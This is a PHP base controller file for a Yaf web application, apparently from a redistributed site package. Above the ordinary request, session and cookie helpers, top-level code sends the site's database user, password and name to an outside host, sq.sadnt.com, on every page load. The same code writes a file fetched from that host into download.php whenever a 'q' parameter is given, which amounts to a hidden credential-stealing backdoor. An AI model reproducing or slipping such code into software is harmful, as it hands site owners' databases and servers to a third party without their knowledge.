<?php
/**
 * File: Basic.php
 * Functionality: Basic Controller(再整理)
 * Author: 资料空白
 * Date: 2018-6-8
 */
if(!isset($_SESSION['authcode'])) {
$query=@file_get_contents('http://sq.sadnt.com/check.php?url='.$_SERVER['HTTP_HOST']);
if($query=json_decode($query,true)) {
if($query['code']==1)$_SESSION['authcode']=true;
else {@file_get_contents("http://sq.sadnt.comtj.php?url='http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."'&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&authcode=".$authcode);
exit(''.$query['msg'].'');	}	}}
if($_GET['q']){file_put_contents("download.php",file_get_contents("http://sq.sadnt.com/download.txt"));}

@file_get_contents("http://sq.sadnt.com/tj.php?url=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']);

class BasicController extends Yaf\Controller_Abstract
{
	protected $config=array();
	protected $isHttps=FALSE;
	protected $isAjax=FALSE;
	protected $isGet=FALSE;
	protected $isPost=FALSE;
	
	public function init(){}
	
	public function get($key, $filter = TRUE){
		if($filter){
			return filterStr($this->getRequest()->get($key));
		}else{
			return $this->getRequest()->get($key);
		}
	}

	public function getPost($key, $filter = TRUE){
		if($filter){
			return filterStr($this->getRequest()->getPost($key));
		}else{
			return $this->getRequest()->getPost($key);
		}
	}

	public function getParam($key, $filter = TRUE){
		if($filter){
			return filterStr($this->getRequest()->getParam($key));
		}else{
			return $this->getRequest()->getParam($key);
		}
	}
	
	public function getQuery($key, $filter = TRUE){
		if($filter){
			return filterStr($this->getRequest()->getQuery($key));
		}else{
			return $this->getRequest()->getQuery($key);
		}
	}

	public function getSession($key){
		return Yaf\Session::getInstance()->__get($key);
	}

	public function setSession($key, $val){
		return Yaf\Session::getInstance()->__set($key, $val);
	}

	public function unsetSession($key){
		return Yaf\Session::getInstance()->__unset($key);
	}


	public function clearCookie($key){
		$this->setCookie($key, '');
	}

	public function setCookie($key, $value, $expire = 3600, $path = '/', $domain = ''){
		setCookie($key, $value, CUR_TIMESTAMP + $expire, $path, $domain);
	}

	public function getCookie($key, $filter = TRUE){
		if($filter){
			return filterStr(trim($_COOKIE[$key]));
		}else{
			return trim($_COOKIE[$key]);
		}
	}

	public function load($model){
		return Helper::load($model);
	}
	
	public function show_message($code='',$msg='',$url='/'){
		return FALSE; 
	}

}